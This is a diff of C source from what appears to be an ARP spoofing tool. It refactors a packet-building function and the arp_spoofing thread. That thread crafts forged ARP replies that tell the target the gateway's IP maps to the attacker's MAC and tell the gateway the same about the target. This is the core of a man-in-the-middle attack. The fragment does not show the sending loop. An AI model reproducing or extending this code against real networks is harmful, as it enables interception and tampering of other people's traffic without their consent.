@@ -2,7 +2,7 @@
 #include "utils.h"
 
 
-uint8_t* construct_arp_pac(int sock_r, struct sockaddr_ll socket_address, unsigned int addr_len, uint8_t* sha, uint8_t* tha, uint8_t* spa, uint8_t* tpa, unsigned int op){
+uint8_t* construct_arp_pac(int sock_r, unsigned int addr_len, uint8_t* sha, uint8_t* tha, uint8_t* spa, uint8_t* tpa, unsigned int op){
     struct ether_header *eth_hdr = (struct ether_header*) malloc(sizeof(struct ether_header));
     memset(eth_hdr, 0, sizeof(struct ether_header));
     int i;
@@ -47,12 +47,8 @@ uint8_t* get_mac(int sock_r, struct sockaddr_ll socket_address, unsigned int add
 
     uint8_t* broadcast_mac = calloc(6, sizeof(uint8_t));
     memset(broadcast_mac, 0xff, 6*sizeof(uint8_t));
-    uint8_t* arp_req = construct_arp_pac(sock_r, socket_address, addr_len, my_mac, broadcast_mac, my_ip, target_ip, ARPOP_REQUEST);
-    /*
-    for(i =0; i<len;i++)
-        printf("%.2x ", *(arp_pac+i));
-    printf("\nSize = %d\n", len);
-    */
+    uint8_t* arp_req = construct_arp_pac(sock_r, addr_len, my_mac, broadcast_mac, my_ip, target_ip, ARPOP_REQUEST);
+
     uint8_t *arp_rep = malloc(ARP_PACKET_LEN);
     memset(arp_rep, 0 , ARP_PACKET_LEN);
 
@@ -90,8 +86,8 @@ void *arp_spoofing(void *args){
         exit(0);
     }
     attacking_args_t *argument = (attacking_args_t*) args;
-    uint8_t* arp_rep_target = construct_arp_pac(sock_r, argument->socket_address, argument->addr_len, argument->my_mac, argument->target_mac, argument->gateway_ip, argument->target_ip, ARPOP_REPLY);
-    uint8_t* arp_rep_gateway = construct_arp_pac(sock_r, argument->socket_address, argument->addr_len, argument->my_mac, argument->gateway_mac, argument->target_ip, argument->gateway_ip, ARPOP_REPLY);
+    uint8_t* arp_rep_target = construct_arp_pac(sock_r, argument->addr_len, argument->my_mac, argument->target_mac, argument->gateway_ip, argument->target_ip, ARPOP_REPLY);
+    uint8_t* arp_rep_gateway = construct_arp_pac(sock_r, argument->addr_len, argument->my_mac, argument->gateway_mac, argument->target_ip, argument->gateway_ip, ARPOP_REPLY);
     /*
     int i;
     for(i =0; i<ARP_PACKET_LEN;i++)
